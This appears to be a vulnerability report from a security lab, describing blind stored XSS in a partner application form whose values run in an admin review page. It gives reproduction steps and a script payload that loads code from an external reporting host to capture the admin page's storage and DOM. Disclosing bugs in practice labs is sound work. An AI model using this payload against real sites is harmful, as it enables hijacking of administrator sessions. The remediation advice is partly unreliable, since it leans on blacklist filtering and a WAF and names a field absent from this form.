## Title
Blind XSS - PartnerHub Partner Portal

## Description
**Affected URL:** https://partnerhub.pwnedbox.site/

The PartnerHub partner application form accepts attacker-controlled input in multiple fields, including company details, contact information, and partnership details. The submitted values are stored and later displayed in the administrative application review interface without proper output encoding. A crafted script payload referencing an XSS reporting endpoint was submitted through the application form. The callback was received from the PartnerHub administrative application page, demonstrating blind stored cross-site scripting (XSS) in the reviewer’s browser.

## Steps to Reproduce

1. Open the PartnerHub partner application page: https://partnerhub.pwnedbox.site/apply.php
2. Enter a script payload containing an XSS reporting callback URL into the application fields. The tested payload used the following structure: `"><script src=https://xss.report/c/priyanshop></script>`
3. Complete the required fields and submit the partner application.
4. Observe the application confirmation page, which displays the submitted values.
5. Log in to the administrative interface using the credentials provided by the lab.
6. Open the submitted application in the admin dashboard.
7. Observe that the submitted values are rendered in the application review page.
8. Check the XSS reporting dashboard and verify that a callback was received from the PartnerHub administrative page.
9. Review the captured page information in the callback report to confirm that the payload was processed in the admin context.


## POC (Proof of Concept)

Screenshot 1: Payload entered into the company, country/region, contact, and phone fields.

<img width="1913" height="972" alt="image" src="https://github.com/user-attachments/assets/9de68626-0fc9-48b7-a2ce-718c3031682a" />

Screenshot 2: Payload entered into partnership details fields before submitting the application.

<img width="1913" height="968" alt="image" src="https://github.com/user-attachments/assets/476f21ec-7d4c-4c9e-a338-b80ec154be2b" />

Screenshot 3: Application submission confirmation page showing the submitted value.

<img width="1912" height="973" alt="image" src="https://github.com/user-attachments/assets/0e3a284a-d423-405e-9550-f357b43c114e" />

Screenshot 4: PartnerHub administrative login page.

<img width="1918" height="953" alt="image" src="https://github.com/user-attachments/assets/e5a24441-9f11-47e4-8f44-c0ba478b4bd1" />

Screenshot 5: Submitted application displayed in the administrative review interface.

<img width="1916" height="953" alt="image" src="https://github.com/user-attachments/assets/e37dfb60-ff50-446b-83db-8ca43fa8f7a6" />

Screenshot 6: XSS reporting dashboard showing callbacks associated with the PartnerHub administrative page.

<img width="1918" height="970" alt="image" src="https://github.com/user-attachments/assets/fc93d472-3415-47a2-8670-1ccdbc296e11" />

Screenshot 7: Callback details showing captured session storage, local storage, and DOM information.

<img width="1918" height="958" alt="image" src="https://github.com/user-attachments/assets/2bdaeddd-729a-452f-9995-6d27619f4a3e" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
